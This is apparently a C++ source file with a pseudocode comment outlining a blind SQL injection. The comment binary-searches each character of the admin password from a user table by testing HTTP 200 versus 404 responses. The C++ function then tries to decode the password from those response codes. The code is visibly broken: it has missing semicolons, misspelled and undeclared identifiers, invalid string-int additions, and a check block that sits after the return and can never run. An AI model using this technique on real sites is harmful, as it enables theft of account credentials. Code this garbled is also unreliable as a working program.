/*
begin=0
end=127
for i in range(1,13):
    mid=(begin+end)/2
    payloads=substring((select password ffrom user where name='admin'),i,1)>mid 
    request.res(payload)
    if request.res_code==200:
        begin=mid+1
    else
        end=mid-1
*/
/*
result=[200,200,200,404,404,.....]
*/
#include<iostream>
#include<map>
#include<vector>
using namespace std;

string getPassword(int* result, int resultLen)
{
    int begin=0, end=127;
    int mid=(begin+end)/2;
    int start=0
    map<string, int> res;
    string password="";
    string up="up", dwon="down";
    for(int i=0; i<resultLen-1; ++i)
    {
        if(result[i]==200 && result[i+1]==200)
        {
            begin=mid+1;
            mid=(begin+end)/2
        }
        if(result[i]==200 && result[i+1]==404)
        {
            begin=mid+1;
            res[up+start]=mid;
            start++;
            mid=(begin+end)/2;
            res[up+start]=mid;
            start++;
            password+=mid;
        }
        else if(result[i]==404 && result[i+1]==200)
        {
            end=mid;
            password+=mid;
            res[down+start]=mid;
            mid=(begin+mid)/2;
            start++;
            res[down+start]=mid;
        }
        else if(result[i]==404 && result[i+1]==404)
        {
            end=mid;
            mid=(begin+mid)/2;
        }
    }
    return password;
    /*
    check the password
    */
    bool flag[password.size()]={false};
    for(i=0;i<res.size();i+=2)
    {
        if(password.find(up+i))
            if(res[up+i]<password[i]<=res[up+i+1])
                flag[i]=true;
        if(password.find(down+i))
            if(res[down+i+1]<=password[i]<res[dwon+i])
                flag[i]=true;
    }
}